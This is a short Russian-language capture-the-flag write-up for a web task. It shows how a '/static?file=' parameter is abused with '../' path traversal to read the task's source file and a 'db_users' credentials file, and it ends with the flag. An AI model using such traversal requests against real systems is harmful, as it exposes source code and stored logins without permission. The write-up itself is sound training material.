# Tea for teacher

## Описание

Лучшие рестораны мира хранят свои рецепты в самых надежных хранилищах. Вот одно из них: 

(ссылка)

## Решение

Изучив таск, можно заметить некорректное подключение `main.css`:

```
<link rel="stylesheet" type="text/css" href="/static?file=main.css">
```

Также можно заметить заголовок `Script-File`, содержащий файл с исходным кодом таска. Достанем его:

```
(ссылка)/static?file=../sourcefile.py
```

В файле можно заметить, что логин и пароль достаются из текстового файла `db_users`:


```
db = open('db_users','r').read().split('\n')
users = {u.split(':')[0]:u.split(':')[1] for u in db}

```

Теперь достанем "базу данных", откуда возьмем логин и пароль для входа.

```
(ссылка)/static?file=../db_users

```

## Флаг

TeacherCTF{61v3_m3_50m3_lf1_t00_plz}